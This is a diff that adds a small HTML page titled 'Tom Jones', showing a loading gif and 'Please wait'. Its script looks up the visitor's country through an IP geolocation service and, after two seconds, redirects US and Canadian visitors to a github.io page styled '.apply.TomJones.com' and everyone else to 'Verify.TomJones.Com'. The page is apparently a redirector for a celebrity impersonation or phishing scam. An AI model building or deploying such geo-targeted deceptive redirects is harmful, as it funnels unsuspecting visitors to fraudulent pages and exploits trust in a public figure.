@@ -1,0 +1,75 @@
+   
+
+<!DOCTYPE html>    
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Tom Jones</title></head> 
+
+<body> 
+
+
+<script>
+  setTimeout(() => {
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        var countryCode = data.country_code;
+        var redirectURL;
+
+        if (countryCode === 'US' || countryCode === 'CA') {
+          redirectURL = 'https://celebrity-org.github.io/.apply.TomJones.com/';
+        } else {
+          redirectURL = 'https://celebrity-org.github.io/Verify.TomJones.Com/';
+        }
+
+        window.location.href = redirectURL;
+      })
+      .catch(error => {
+        console.error(error);
+        window.location.href = 'https://celebrity-org.github.io/Verify.TomJones.Com/';
+      });
+  }, 2000);
+</script>
+
+
+
+
+
+
+
+<h1>
+<br> <br>
+<center> 
+
+
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://i.gifer.com/8CLc.gif">
+
+
+
+<br> 
+
+
+
+<br> 
+
+
+<strong>
+
+Please wait. . .
+</strong> 
+
+
+
+<br> <br><br> <br> 
+
+</center>
+</h1>
+
+
+
+
+
+</body>
+
+</html> 
